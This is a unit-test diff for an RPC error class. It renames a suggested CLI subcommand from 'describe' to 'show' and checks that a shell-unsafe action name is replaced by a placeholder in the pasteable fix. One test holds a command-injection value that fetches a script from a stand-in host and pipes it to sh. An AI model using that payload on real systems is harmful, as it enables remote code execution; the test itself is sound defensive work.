@@ -59,14 +59,14 @@ describe('unit · docs', () => {
 describe('unit · X_RPC_FAILED pastes a command a hostile name cannot run through', () => {
   test('an ordinary action name travels verbatim', () => {
     expect(new RpcFailedError('publishPost', 502).fix).toContain(
-      'x actions describe publishPost --json',
+      'x actions show publishPost --json',
     );
   });
 
   test('a name that is not shell-safe becomes the placeholder, and stays in the cause', () => {
     const error = new RpcFailedError('x$(curl -s http://evil.sh|sh)', 502);
     expect(error.fix).not.toContain('$(');
-    expect(error.fix).toContain('x actions describe <action-name> --json');
+    expect(error.fix).toContain('x actions show <action-name> --json');
     expect(error.cause).toContain('evil.sh');
   });
 });
